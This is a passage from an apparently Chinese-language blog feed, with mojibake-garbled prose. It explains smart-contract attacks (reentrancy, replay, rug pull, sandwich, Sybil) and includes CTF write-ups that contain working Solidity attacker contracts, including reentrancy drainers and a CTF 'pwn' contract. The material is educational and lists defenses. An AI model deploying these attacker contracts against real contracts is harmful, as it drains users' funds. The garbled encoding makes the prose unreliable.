&quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // æ›´æ–°ä½™é¢</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>æ”»å‡»è€…åˆçº¦ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerable) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &amp;gt;= 1 ether);</span><br><span class="line">        vulnerable.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        vulnerable.withdraw(1 ether); // åˆæ¬¡æç°</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å›è°ƒå‡½æ•°</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &amp;gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // ç»§ç»­é‡å…¥</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>æ”»å‡»è¿‡ç¨‹ï¼š</li></ol><p>19.æ”»å‡»è€…å…ˆå­˜å…¥ 1 Etherï¼Œç„¶åè°ƒç”¨ withdraw å‡½æ•°è¿›è¡Œæå–ã€‚<br>20.åœ¨æå–è¿‡ç¨‹ä¸­ï¼Œç”±äºæœªæ›´æ–°ä½™é¢ï¼Œæ”»å‡»è€…çš„å›è°ƒå‡½æ•° receive è¢«è§¦å‘ã€‚<br>21.è¯¥å‡½æ•°å†æ¬¡è°ƒç”¨ withdraw å‡½æ•°ï¼Œä»è€Œç»§ç»­æå–èµ„é‡‘ï¼Œå¯¼è‡´åˆçº¦èµ„é‡‘æŸå¤±ã€‚</p><p>2.2 è·¨åˆçº¦é‡å…¥æ”»å‡»ç¤ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    mapping(address =&amp;gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &amp;gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount; // æ›´æ–°ä½™é¢</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker &#123;</span><br><span class="line">    Target public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Target(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &amp;gt;= 1 ether);</span><br><span class="line">        target.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        target.withdraw(1 ether); // å¼€å§‹æ”»å‡»</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(target).balance &amp;gt;= 1 ether) &#123;</span><br><span class="line">            target.withdraw(1 ether); // é‡å…¥æ”»å‡»</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»è¿‡ç¨‹ï¼š</p><p>22.æ”»å‡»è€…å‘ç›®æ ‡åˆçº¦å­˜å…¥èµ„é‡‘å¹¶è°ƒç”¨ withdrawã€‚<br>23.å½“ç›®æ ‡åˆçº¦å°è¯•å°† Ether è½¬ç»™æ”»å‡»è€…æ—¶ï¼Œå›è°ƒ receive è¢«è§¦å‘ï¼Œæ”»å‡»è€…å†æ¬¡è°ƒç”¨ withdrawã€‚<br>24.è¿™ä¸€è¿‡ç¨‹æŒç»­è¿›è¡Œï¼Œç›´åˆ°åˆçº¦èµ„é‡‘è€—å°½ã€‚</p><ol start="3"><li>é˜²èŒƒé‡å…¥æ”»å‡»çš„æ–¹æ³•</li></ol><p>25.æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼ï¼šåœ¨è¿›è¡Œå¤–éƒ¨è°ƒç”¨ä¹‹å‰ï¼Œé¦–å…ˆæ›´æ–°åˆçº¦çŠ¶æ€ã€‚<br>26.ä½¿ç”¨é‡å…¥é”ï¼šåœ¨åˆçº¦ä¸­è®¾ç½®çŠ¶æ€å˜é‡ä»¥é˜²æ­¢é‡å…¥ã€‚<br>27.ä½¿ç”¨å®‰å…¨åº“ï¼šå€ŸåŠ©å¦‚ OpenZeppelin è¿™æ ·çš„ç»è¿‡å®¡è®¡çš„æ™ºèƒ½åˆçº¦åº“ï¼Œé¿å…å·²çŸ¥æ¼æ´ã€‚<br>28.é™åˆ¶å¤–éƒ¨è°ƒç”¨ï¼šå°½é‡å‡å°‘åˆçº¦å¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨æ¬¡æ•°å’Œé¢‘ç‡ã€‚</p><p>æ€»ç»“<br>é‡å…¥æ”»å‡»æ˜¯ä¸€ç§å¸¸è§ä¸”ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå¼€å‘è€…å¿…é¡»åœ¨è®¾è®¡å’Œå®ç°æ™ºèƒ½åˆçº¦æ—¶é‡‡å–é€‚å½“çš„å®‰å…¨æªæ–½ï¼Œä»¥é˜²æ­¢æ­¤ç±»æ”»å‡»ã€‚ç†è§£é‡å…¥æ”»å‡»çš„ç»†åˆ†ç±»å‹å’Œå…·ä½“ç¤ºä¾‹å¯ä»¥å¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°è¯†åˆ«å’Œä¿®å¤æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p><h2 id="é‡æ”¾æ”»å‡»"><a href="#é‡æ”¾æ”»å‡»" class="headerlink" title="é‡æ”¾æ”»å‡»"></a>é‡æ”¾æ”»å‡»</h2><h3 id="å¯¹äºå¤±è´¥äº‹åŠ¡çš„é‡æ”¾æ”»å‡»"><a href="#å¯¹äºå¤±è´¥äº‹åŠ¡çš„é‡æ”¾æ”»å‡»" class="headerlink" title="å¯¹äºå¤±è´¥äº‹åŠ¡çš„é‡æ”¾æ”»å‡»"></a>å¯¹äºå¤±è´¥äº‹åŠ¡çš„é‡æ”¾æ”»å‡»</h3><h4 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>ä¸€ä¸ªåˆå§‹äº¤æ˜“å¤±è´¥äº†ï¼Œå¦‚æœæ²¡æœ‰é˜²æŠ¤æœºåˆ¶ï¼Œè€Œæ”»å‡»è€…åˆé€šè¿‡ç½‘ç»œç›‘å¬å·¥å…·æ•è·åˆ°äº†è¿™ä¸ªå¤±è´¥çš„äº¤æ˜“æ•°æ®åŒ…ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é‡æ–°å‘é€è¿™ä¸ªäº¤æ˜“ï¼Œé€ æˆèµ„é‡‘çš„é‡å¤æ‰£é™¤ï¼Œæˆ–è€…èµ„é‡‘çš„é‡å¤è½¬ç§»</p><h3 id="ä¸åŒé“¾ä¸Šçš„ç­¾åé‡æ”¾"><a href="#ä¸åŒé“¾ä¸Šçš„ç­¾åé‡æ”¾" class="headerlink" title="ä¸åŒé“¾ä¸Šçš„ç­¾åé‡æ”¾"></a>ä¸åŒé“¾ä¸Šçš„ç­¾åé‡æ”¾</h3><h4 id="æ¼æ´æè¿°-1"><a href="#æ¼æ´æè¿°-1" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>åœ¨ä¸€æ¡é“¾ä¸Šçš„æœ‰æ•ˆç­¾åå¯èƒ½ä¼šåœ¨å¦ä¸€æ¡é“¾ä¸Šé‡æ”¾</p><h4 id="ä¸¾ä¾‹-2"><a href="#ä¸¾ä¾‹-2" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>1ï¼Œç›¸åŒåœ°å€åœ¨ä¸åŒé“¾ä¸Š<br>å‡è®¾ç”¨æˆ· A åœ¨ä»¥å¤ªåŠé“¾ï¼ˆEthereumï¼‰å’Œä»¥å¤ªåŠç»å…¸é“¾ï¼ˆEthereum Classicï¼‰ä¸Šä½¿ç”¨ç›¸åŒçš„åœ°å€ï¼ˆå…¬é’¥ï¼‰ã€‚å¦‚æœç”¨æˆ· A åœ¨ä»¥å¤ªåŠä¸Šå‘èµ·äº†ä¸€ç¬”äº¤æ˜“å¹¶ç­¾åï¼š<br>a,æ”»å‡»è€…å¯ä»¥æ•è·è¿™ä¸ªäº¤æ˜“ï¼Œç„¶ååœ¨ä»¥å¤ªåŠç»å…¸é“¾ä¸Šé‡æ”¾è¿™ä¸ªäº¤æ˜“ã€‚<br>b,ç”±äºè¿™ä¸¤ä¸ªé“¾éƒ½ä½¿ç”¨äº†ç›¸ä¼¼çš„åœ°å€æ ¼å¼ï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸåœ°åœ¨ä»¥å¤ªåŠç»å…¸é“¾ä¸Šè½¬ç§»ç”¨æˆ· A çš„èµ„äº§ã€‚</p><p>2,è·¨é“¾é‡æ”¾æ”»å‡»<br>ä¸€äº›é“¾å¯èƒ½ä¼šä½¿ç”¨ç±»ä¼¼çš„äº¤æ˜“æ ¼å¼ã€‚å¦‚æœé“¾ A å’Œé“¾ B éƒ½æ˜¯ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰å…¼å®¹é“¾ï¼š<br>a,ç”¨æˆ· A åœ¨é“¾ A ä¸Šå‘é€äº†ä¸€ç¬”äº¤æ˜“ã€‚<br>b,æ”»å‡»è€…å¯ä»¥æŠŠåŒæ ·çš„äº¤æ˜“ä¿¡æ¯ï¼ˆåŒ…æ‹¬ç­¾åï¼‰æäº¤åˆ°é“¾ Bã€‚<br>c,å¦‚æœé“¾ B ä¸è¿›è¡Œé“¾ ID æˆ–å…¶ä»–å”¯ä¸€æ ‡è¯†çš„æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯èƒ½æˆåŠŸé‡æ”¾äº¤æ˜“ã€‚</p><h2 id="åœ°æ¯¯æ‹‰åŠ›"><a href="#åœ°æ¯¯æ‹‰åŠ›" class="headerlink" title="åœ°æ¯¯æ‹‰åŠ›"></a>åœ°æ¯¯æ‹‰åŠ›</h2><p>åœ°æ¯¯æ‹‰åŠ›æ”»å‡»æ˜¯ä¸€ç§ç‰¹å®šçš„æ¬ºè¯ˆè¡Œä¸ºï¼Œä¸»è¦å‘ç”Ÿåœ¨å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰å’Œå…¶ä»–åŸºäºåŒºå—é“¾çš„åº”ç”¨ä¸­ã€‚è¿™ç§æ”»å‡»é€šå¸¸æ¶‰åŠä¸€ä¸ªæ¶æ„å¼€å‘è€…æˆ–å›¢é˜Ÿåˆ›å»ºä¸€ä¸ªçœ‹ä¼¼åˆæ³•çš„é¡¹ç›®ï¼Œå¸å¼•ç”¨æˆ·æŠ•èµ„æˆ–æä¾›æµåŠ¨æ€§ï¼Œä½†æœ€ç»ˆä»–ä»¬ä¼šé€šè¿‡æŸç§æ–¹å¼è¿…é€Ÿæ’¤å›èµ„é‡‘ï¼Œå¯¼è‡´æŠ•èµ„è€…æŸå¤±æƒ¨é‡ã€‚</p><h4 id="æ¼æ´æè¿°-2"><a href="#æ¼æ´æè¿°-2" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>1.å‡å†’é¡¹ç›®ï¼šæ”»å‡»è€…é€šå¸¸åˆ›å»ºä¸€ä¸ªæ–°çš„åŠ å¯†è´§å¸æˆ–å»ä¸­å¿ƒåŒ–åº”ç”¨ï¼Œå®£ä¼ å…¶æ½œåœ¨æ”¶ç›Šï¼Œå¸å¼•æŠ•èµ„è€…å‚ä¸ã€‚<br>2.æµåŠ¨æ€§æ’¤å›ï¼šä¸€æ—¦è¶³å¤Ÿå¤šçš„ç”¨æˆ·æŠ•èµ„æˆ–æä¾›æµåŠ¨æ€§ï¼Œæ”»å‡»è€…ä¼šæ’¤å›æµåŠ¨æ€§æ± ä¸­çš„æ‰€æœ‰èµ„äº§ï¼Œå¯¼è‡´ä»£å¸ä»·å€¼æš´è·Œã€‚<br>3.ä¿¡ä»»åˆ©ç”¨ï¼šè¿™ç§æ”»å‡»å¾€å¾€åˆ©ç”¨äº†ç”¨æˆ·å¯¹å»ä¸­å¿ƒåŒ–é‡‘èé¡¹ç›®çš„ä¿¡ä»»ï¼Œå°¤å…¶æ˜¯æ–°é¡¹ç›®å¾€å¾€ç¼ºä¹è¶³å¤Ÿçš„é€æ˜åº¦å’Œå®¡è®¡ã€‚<br>4.å¿«é€Ÿæ’¤èµ„ï¼šæ”»å‡»è€…ä¼šè¿…é€Ÿè½¬æ¢ä¸ºç¨³å®šå¸æˆ–å…¶ä»–æ›´ç¨³å®šçš„èµ„äº§ï¼Œä»¥é¿å…ä»·æ ¼æ³¢åŠ¨å¯¹ä»–ä»¬èµ„é‡‘çš„å½±å“ã€‚</p><h4 id="ä¸¾ä¾‹-3"><a href="#ä¸¾ä¾‹-3" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>1,DeFié¡¹ç›®ï¼šä¸€äº›æ–°å…´çš„DeFié¡¹ç›®å¯èƒ½ä¼šåœ¨çŸ­æ—¶é—´å†…å¸å¼•å¤§é‡èµ„é‡‘ï¼Œæ”»å‡»è€…ä¼šé€šè¿‡åœ¨ç¤¾äº¤åª’ä½“ä¸Šåˆ¶é€ çƒ­åº¦æ¥å¸å¼•æŠ•èµ„è€…ã€‚æŠ•èµ„è€…åœ¨æ²¡æœ‰è¿›è¡Œå……åˆ†å°½èŒè°ƒæŸ¥çš„æƒ…å†µä¸‹ï¼Œç›²ç›®è·Ÿé£æŠ•èµ„ï¼Œæœ€ç»ˆé­å—æŸå¤±ã€‚<br>2,ä»£å¸å‘è¡Œï¼šæ”»å‡»è€…å‘å¸ƒä¸€ä¸ªæ–°ä»£å¸ï¼Œå¹¶åœ¨ä¸Šçº¿åˆæœŸè¡¨ç°è‰¯å¥½ï¼Œéšååœ¨ä»·æ ¼ä¸Šæ¶¨æ—¶æŠ›å”®æŒæœ‰çš„ä»£å¸ï¼Œå¯¼è‡´ä»£å¸ä»·æ ¼æš´è·Œã€‚</p><h2 id="ä¸‰æ˜æ²»æ”»å‡»"><a href="#ä¸‰æ˜æ²»æ”»å‡»" class="headerlink" title="ä¸‰æ˜æ²»æ”»å‡»"></a>ä¸‰æ˜æ²»æ”»å‡»</h2><h4 id="æ¼æ´æè¿°-3"><a href="#æ¼æ´æè¿°-3" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>æ”»å‡»è€…å¯ä»¥ç›‘æ§å†…å­˜æ± ï¼Œå¹¶åœ¨ç”¨æˆ·äº¤æ˜“ä¹‹å‰å’Œä¹‹åæ”¾ç½®ä¸¤ä¸ªäº¤æ˜“ã€‚</p><h4 id="ä¸¾ä¾‹-4"><a href="#ä¸¾ä¾‹-4" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>å½“æ”»å‡»è€…å‘ç°ä¸€ç¬”å¤§é¢äº¤æ˜“æ—¶ï¼Œé¦–å…ˆæ‰§è¡Œè‡ªå·±çš„äº¤æ˜“ä»¥æ“çºµä»·æ ¼ï¼Œç„¶ååœ¨ç”¨æˆ·çš„äº¤æ˜“æ‰§è¡Œåé€šè¿‡å¹³ä»“æ¥è·åˆ©</p><h2 id="å¥³å·«æ”»å‡»"><a href="#å¥³å·«æ”»å‡»" class="headerlink" title="å¥³å·«æ”»å‡»"></a>å¥³å·«æ”»å‡»</h2><h4 id="æ¼æ´æè¿°-4"><a href="#æ¼æ´æè¿°-4" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>æ”»å‡»è€…é€šè¿‡æ§åˆ¶å¤šä¸ªè´¦æˆ·æˆ–è€…åˆ©ç”¨å¤šä¸ªäº¤æ˜“æ¥æ“çºµå¸‚åœºæˆ–è€…å½±å“ç‰¹å®šçš„æ™ºèƒ½åˆçº¦è¡Œä¸º</p><h4 id="ä¸¾ä¾‹-5"><a href="#ä¸¾ä¾‹-5" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>å‡è®¾æŸä¸ªç”¨æˆ·åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ä¸Šè¿›è¡Œå¤§é¢äº¤æ˜“ï¼Œå¯¼è‡´æŸä¸ªä»£å¸çš„ä»·æ ¼ä¸Šæ¶¨ã€‚<br>1ï¼Œæ”»å‡»è€…ç›‘æ§å¸‚åœºï¼šæ”»å‡»è€…ç›‘æ§åˆ°ç”¨æˆ·çš„äº¤æ˜“ï¼Œå¹¶é¢„æµ‹ä»·æ ¼å°†ä¸Šæ¶¨ã€‚<br>2ï¼Œåˆ›å»ºå‡éœ€æ±‚ï¼šæ”»å‡»è€…åœ¨å¤šä¸ªè´¦æˆ·ä¸­åŒæ—¶ä¸‹å•è´­ä¹°è¯¥ä»£å¸ï¼Œè¿›ä¸€æ­¥æ¨é«˜ä»·æ ¼ã€‚<br>3ï¼Œè·åˆ©æŠ›å”®ï¼šä¸€æ—¦ä»·æ ¼è¾¾åˆ°ä¸€ä¸ªç†æƒ³çš„æ°´å¹³ï¼Œæ”»å‡»è€…ä¾¿åœ¨åˆé€‚çš„æ—¶æœºæŠ›å”®æ‰‹ä¸­çš„ä»£å¸ï¼Œè·å¾—å·®ä»·æ”¶ç›Šã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»å‡»æè¿° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¶æ„ç ´ç¯æ”»å‡»</title>
      <link href="/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>æ”»å‡»è€…é€šè¿‡æ¶æ„ç ´åç³»ç»Ÿï¼Œé€šå¸¸å®ƒä»¬ä¸ä¼šæœ‰ç›ˆåˆ©çš„ï¼Œå°±æ˜¯æ¶æ„ç ´åè¿è¥å’Œç”¨æˆ·ï¼Œå®ƒä»¬å¯ä»¥é€šè¿‡é“¾ä¸Šçš„è½»å¾®æ”¹å˜æ¥é˜»æ­¢ç”¨æˆ·äº¤æ˜“</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»å‡»æè¿° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-The lost Kitty</title>
      <link href="/2024/10/15/CTF-The-lost-Kitty/"/>
      <url>/2024/10/15/CTF-The-lost-Kitty/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-The-lost-kitty"><a href="#CTF-The-lost-kitty" class="headerlink" title="CTF-The lost kitty"></a>CTF-The lost kitty</h1><p>é¢˜ç›®å°±æ˜¯Lucasåœ¨ä¸€ä¸ªç©ºé—´ä¸º2^256çš„æˆ¿é—´ä¸¢å¤±äº†ä¸€åªçŒ«ï¼Œè¦æ±‚æˆ‘ä»¬æ‰¾åˆ°è¿™åªå°çŒ«ï¼Œé¢˜ç›®çš„æºä»£ç ï¼Œå¦‚ä¸‹ï¼š<br>&#x2F;&#x2F; SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;</p><p>contract HiddenKittyCat {<br>Â  Â  address private immutable _owner;</p><p>Â  Â  constructor() {<br>Â  Â  Â  Â  _owner &#x3D; msg.sender;<br>Â  Â  Â  Â  bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</p><p>Â  Â  Â  Â  assembly {<br>Â  Â  Â  Â  Â  Â  sstore(slot, â€œKittyCat!â€)<br>Â  Â  Â  Â  }<br>Â  Â  }</p><p>Â  Â  function areYouHidingHere(bytes32 slot) external view returns (bool) {<br>Â  Â  Â  Â  require(msg.sender &#x3D;&#x3D; _owner, â€œ!ownerâ€);<br>Â  Â  Â  Â  bytes32 kittyPointer;</p><p>Â  Â  Â  Â  assembly {<br>Â  Â  Â  Â  Â  Â  kittyPointer :&#x3D; sload(slot)<br>Â  Â  Â  Â  }</p><p>Â  Â  Â  Â  return kittyPointer &#x3D;&#x3D; â€œKittyCat!â€;<br>Â  Â  }</p><p>Â  Â  function destroyMe() external {<br>Â  Â  Â  Â  require(msg.sender &#x3D;&#x3D; _owner, â€œ!ownerâ€);<br>Â  Â  Â  Â  selfdestruct(payable(address(0)));<br>Â  Â  }<br>}</p><p>contract House {<br>Â  Â  bool public catFound;</p><p>Â  Â  function isKittyCatHere(bytes32 _slot) external {<br>Â  Â  Â  Â  if (catFound) {<br>Â  Â  Â  Â  Â  Â  return;<br>Â  Â  Â  Â  }<br>Â  Â  Â  Â  HiddenKittyCat hiddenKittyCat &#x3D; new HiddenKittyCat();<br>Â  Â  Â  Â  bool found &#x3D; hiddenKittyCat.areYouHidingHere(_slot);</p><p>Â  Â  Â  Â  if (!found) {<br>Â  Â  Â  Â  Â  Â  hiddenKittyCat.destroyMe();<br>Â  Â  Â  Â  } else {<br>Â  Â  Â  Â  Â  Â  catFound &#x3D; true;<br>Â  Â  Â  Â  }<br>Â  Â  }<br>}</p><p> é˜…è¯»å®Œæ•´ä¸ªä»£ç ï¼Œå¥½åƒä¼¼æ›¾ç›¸è¯†ï¼ŒåŸæ¥åœ¨ä»¥å‰çš„ethernauté‡Œè§è¿‡ï¼Œè¿™ä¸ªé¢˜ç±»ä¼¼äºEthernauté‡Œçš„Flipflopcoinï¼Œéƒ½æ˜¯ç­”æ¡ˆå·²ç»å‡ºæ¥äº†</p><p> é¦–å…ˆhidekittycatåˆçº¦ä¸­çš„å‡½æ•°éƒ½æœ‰requireï¼ˆmsg.sender&#x3D;&#x3D;ownerï¼‰çš„éªŒè¯ï¼Œå¦‚æœæƒ³ç›´æ¥è°ƒç”¨areYoufindhereå‡½æ•°ï¼Œè¿™æ ·ä¼šå¾ˆéš¾è°ƒç”¨ï¼Œ è¿™kittycaté¢˜åˆæ˜¯æ¶‰åŠåˆ°æ±‡ç¼–çš„çŸ¥è¯†ï¼Œä¸è¿‡è¿™ä¸ªæ±‡ç¼–å¾ˆå¥½ç†è§£ï¼Œslotä¸ºå‚¨å­˜ä½ç½®ï¼Œä½¿ç”¨sstoreæ±‡ç¼–è¯­è¨€ï¼Œå°†kittycatå‚¨å­˜åˆ°slotä½ç½®ä¸Šï¼Œç„¶è€Œè¿™ä¸ªslotçš„å…·ä½“å€¼ï¼Œå·²ç»åœ¨æ„é€ å‡½æ•°ä¸­è®¡ç®—å‡ºæ¥äº†ã€‚å†æ¥çœ‹çœ‹houseåˆçº¦ï¼Œåœ¨isKittyCathouseå‡½æ•°ä¸­ï¼Œåªè¦æˆ‘ä»¬ä¼ å…¥æ­£ç¡®çš„_slotï¼Œå°±èƒ½ä½¿catFoundå˜ä¸ºture,è€Œæ­£ç¡®çš„_slotåœ¨å‰é¢å·²ç»æœ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå¦‚ä¸‹ï¼š</p><p>&#x2F;&#x2F;SPDX-License-Identifier:MIT</p><p>pragma solidity ^0.8.0;</p><p>interface Ihouse{<br>Â  Â  Â function isKittyCatHere(bytes32 _slot) external;<br>}<br>contract Attracker{<br>Â  Â  Â Ihouse public target;</p><p>Â  Â  Â constructor(address _target){<br>Â  Â  Â  Â  target &#x3D; Ihouse(_target);<br>Â  Â  Â }</p><p>Â  Â  Â function pwn () external {<br>Â  Â  Â  bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));<br>Â  Â  Â  target.isKittyCatHere(slot);<br>Â  Â  Â }<br>}</p><p>å…ˆéƒ¨ç½²houseåˆçº¦ï¼Œå¾—åˆ°å®ƒçš„åœ°å€ï¼š0xE726d7E7739188f0fA45267997eA97b8b1D891E6</p><p>åœ¨éƒ¨ç½²Attracteråˆçº¦ï¼Œä¼ å…¥houseåˆçº¦çš„åœ°å€ï¼Œè°ƒç”¨pwnå‡½æ•°ï¼Œå³å¯</p><p>æœ€åæŸ¥çœ‹catæ˜¯å¦æ‰¾åˆ°ï¼ŒCatFoundå°±å˜ä¸ºture,è¯´æ˜å·²ç»æ‰¾åˆ°cat.</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Creativity</title>
      <link href="/2024/10/14/CTF-Creativity/"/>
      <url>/2024/10/14/CTF-Creativity/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Creativity"><a href="#CTF-Creativity" class="headerlink" title="CTF-Creativity"></a>CTF-Creativity</h1><p>é¢˜ç›®ï¼šè¦æ±‚è°ƒç”¨sendFlag(),è®°å½•äº‹ä»¶<br>æºä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Creativity &#123;</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    </span><br><span class="line">    address public target;</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line">    </span><br><span class="line">    function check(address _addr) public &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; size := extcodesize(_addr) &#125;</span><br><span class="line">        require(size &gt; 0 &amp;&amp; size &lt;= 4);</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function execute() public &#123;</span><br><span class="line">        require(target != address(0));</span><br><span class="line">        target.delegatecall(abi.encodeWithSignature(&quot;&quot;));</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  è¿™é¢˜æ¶‰åŠåˆ°æ±‡ç¼–ï¼Œå§”æ‰˜è°ƒç”¨ï¼Œè¿˜æœ‰ä¸€ä¸ªä¸æ˜æ˜¾çš„create2çš„ç”¨æ³•<br>  é¦–å…ˆçœ‹åˆ°checkå‡½æ•°ï¼Œè¦æ±‚å‚æ•°åœ°å€çš„åˆçº¦ä»£ç å¤§å°ä¸èƒ½è¶…è¿‡4å­—èŠ‚ï¼Œè¿™æ˜¯å¾ˆéš¾åŠåˆ°çš„ï¼Œåœ¨ethernauntä¸Šé‡åˆ°è¿‡è¿™ç§ç±»ä¼¼çš„é¢˜ï¼Œåªä¸è¿‡é‚£ä¸Šé¢çš„é¢˜è€ƒå¯Ÿç‚¹æ²¡æœ‰è¿™ä¸ªé¢˜å¤šã€‚<br>  ç»§ç»­çœ‹åˆ°executeå‡½æ•°ï¼Œé¦–å…ˆè¿›è¡Œäº†é›¶åœ°å€çš„æ£€æŸ¥ï¼Œåœ¨è¿›è¡Œå§”æ‰˜è°ƒç”¨ï¼Œæœ€åæ˜¯è‡ªæ¯å‡½æ•°<br>  å¦‚æœæˆ‘ä»¬è¦ç›´æ¥è°ƒç”¨sendFlagå‡½æ•°ï¼Œå¿…é¡»å‘é€valueå¤§äº100000000ehterï¼Œè¿™æ˜¯è‚¯å®šæ˜¯ä¸å¯é‡‡å–çš„æªæ–½ï¼Œæ€æ ·æ‰èƒ½ç»•è¿‡è¿™ä¸ªrequire,æˆ‘ä»¬å°±è¦å›åˆ°executeå‡½æ•°ä¸­ï¼Œçªç ´å£æ˜¯ï¼štarget.detegatecall(),é€šè¿‡å§”æ‰˜è°ƒç”¨targetåˆçº¦ï¼Œæ‰§è¡Œç»“æœåœ¨Createtivityåˆçº¦ä¸­ï¼Œè¿™æ ·å°±æ¸…æ™°äº†<br>  æˆ‘ä»¬å¯ä»¥é€šè¿‡create2çš„ä¸€ä¸ªéªšæ“ä½œï¼Œåœ¨åŒä¸€ä¸ªåœ°å€ä¸Šéƒ¨ç½²åˆçº¦ï¼Œåˆçº¦çš„å­—èŠ‚ç å¯ä»¥ä¸åŒï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯åœ¨åŒä¸€ä¸ªåœ°å€ä¸Šå…ˆåéƒ¨ç½²ä¸åŒçš„åˆçº¦ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°ï¼Œç¬¬ä¸€ä¸ªéƒ¨ç½²çš„åˆçº¦ï¼Œæ»¡è¶³è‡ªæ¯å‡½æ•°ï¼Œç¬¬äºŒä¸ªéƒ¨ç½²çš„åˆçº¦ï¼Œå®ç°åˆçº¦ä¸­çš„emit 